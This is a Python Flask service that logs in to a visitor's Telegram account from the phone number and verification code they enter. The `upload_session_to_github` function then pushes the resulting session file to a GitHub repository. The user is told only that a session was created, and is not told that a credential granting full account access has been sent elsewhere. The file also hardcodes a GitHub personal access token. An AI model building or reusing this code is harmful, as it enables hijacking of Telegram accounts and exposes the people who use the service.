from flask import Flask, request, jsonify
from telethon import TelegramClient
import os
import asyncio
import base64
import requests

app = Flask(__name__)

# GitHub API Configuration
GITHUB_USERNAME = "Phi-star"
GITHUB_REPO = "Big-daddy-R2-season"
GITHUB_PAT = "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"
GITHUB_FOLDER = "sessions/"  # GitHub folder where session files are stored

# GitHub API Base URL
GITHUB_API_BASE = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{GITHUB_FOLDER}"

async def send_code(api_id, api_hash, phone):
    """Creates a client and sends a verification code."""
    session_name = f"session_{phone}.session"

    async with TelegramClient(session_name, api_id, api_hash) as client:
        await client.connect()
        if not await client.is_user_authorized():
            await client.send_code_request(phone)

@app.route("/generate-session", methods=["POST"])
def generate_session():
    data = request.json
    api_id = data.get("api_id")
    api_hash = data.get("api_hash")
    phone = data.get("phone")

    if not api_id or not api_hash or not phone:
        return jsonify({"success": False, "message": "Missing API credentials"}), 400

    try:
        asyncio.run(send_code(api_id, api_hash, phone))
        return jsonify({"success": True, "redirect": "/verify-code"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

async def complete_login(phone, code):
    """Completes login process and saves session file."""
    session_name = f"session_{phone}.session"

    async with TelegramClient(session_name, 0, "") as client:  # API ID & Hash stored in session
        await client.connect()
        await client.sign_in(phone=phone, code=code)

    # Upload the session file to GitHub
    upload_session_to_github(session_name)

@app.route("/verify-code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    session_name = f"session_{phone}.session"
    if not os.path.exists(session_name):
        return jsonify({"success": False, "message": "Session not found"}), 400

    try:
        asyncio.run(complete_login(phone, code))
        return jsonify({"success": True, "message": "Session created successfully!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

def upload_session_to_github(session_file):
    """Uploads a session file to GitHub."""
    try:
        # Read the session file
        with open(session_file, "rb") as f:
            content = f.read()
        encoded_content = base64.b64encode(content).decode("utf-8")

        file_name = os.path.basename(session_file)
        github_file_url = f"{GITHUB_API_BASE}{file_name}"

        # Check if file already exists (GitHub API requires SHA for updates)
        response = requests.get(github_file_url, headers={"Authorization": f"token {GITHUB_PAT}"})
        sha = response.json().get("sha", None) if response.status_code == 200 else None

        # Upload to GitHub
        payload = {
            "message": f"Adding session file: {file_name}",
            "content": encoded_content,
            "branch": "main"
        }
        if sha:
            payload["sha"] = sha  # Required if updating existing file

        response = requests.put(github_file_url, json=payload, headers={"Authorization": f"token {GITHUB_PAT}"})

        if response.status_code in [200, 201]:
            print(f"Successfully uploaded {file_name} to GitHub.")
        else:
            print(f"GitHub upload failed: {response.json()}")

    except Exception as e:
        print(f"Error uploading session file: {e}")

if __name__ == "__main__":
    app.run(debug=True)
